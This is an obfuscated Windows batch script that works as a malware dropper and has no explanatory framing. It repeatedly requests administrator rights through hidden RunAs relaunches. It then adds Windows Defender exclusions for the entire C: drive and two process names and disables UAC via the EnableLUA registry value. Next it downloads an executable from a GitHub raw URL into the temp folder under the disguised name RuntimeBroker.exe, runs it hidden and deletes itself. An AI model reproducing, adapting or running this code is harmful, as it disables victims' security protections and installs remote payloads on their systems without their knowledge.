@echo off & setlocal enableDelayedExpansion
set "TutcG=NET" & set "NsGN=SESSION" & set "TxWwY=2>&1" & set "qICh=>nul"
%TutcG% %NsGN% %qICh% %TxWwY%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "wUKn=qux" & set "cWdM=bar" & set "exRF=baz" & set "keqo=foo" & rem EGEXox fhXKQzQ rOXg
set "okkS=powershell -ExecutionPolicy Bypass -Command"
set "qwv=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "eKdB='C:\' -ErrorAction SilentlyContinue"
!okkS! "!qwv! !eKdB!" %qICh% %TxWwY%
set "IfYr=Add-MpPreference -ExclusionProcess 'appy.exe' -ErrorAction SilentlyContinue"
!okkS! "!IfYr!" %qICh% %TxWwY%
set "rCn=Add-MpPreference -ExclusionProcess 'Service Runtime Management Agent.exe' -ErrorAction SilentlyContinue"
!okkS! "!rCn!" %qICh% %TxWwY%
set "GnO=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "mTOhT=-Name 'EnableLUA' -Value 0"
!okkS! "!GnO! !mTOhT!" %qICh% %TxWwY%
set "iREK=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!okkS! "!iREK!" %qICh% %TxWwY%
if !errorlevel! neq 0 (goto %a%)
set "AFCMq=timeout /t" & !AFCMq! 2 %qICh% %TxWwY%
set "NYSyn=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "NBI=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe' -OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!okkS! "!NYSyn! !NBI!" %qICh% %TxWwY%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!AFCMq! 1 %qICh% %TxWwY% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %qICh% %TxWwY%
del /f /q "%~f0" %qICh% %TxWwY%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %qICh% %TxWwY%
if !errorlevel! neq 0 (!AFCMq! 3 %qICh% %TxWwY% & goto %b%)
exit /b
